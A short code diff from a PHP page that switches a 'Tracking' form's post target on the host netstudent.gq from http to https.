@@ -192,7 +192,7 @@ if(isset($_GET["P"])){
 <div class="container">
     <div class="row">
         <div class="col-md-12 col-xs-12">
-            <form action="http://netstudent.gq" method="post" id="Tracking" style="padding-top:90px;">
+            <form action="https://netstudent.gq" method="post" id="Tracking" style="padding-top:90px;">
                 <input name="__RequestVerificationToken" type="hidden" value="iurjwkm5gqkqkIdWE75i8kL-ylm_fxyPBHQL1u-zj_N3P_D8aQAmkiMjJuVASWUkQ9oDedEVdP6maO0jftej2kJ81rk1" />
                 <h2></h2>
                 <section>
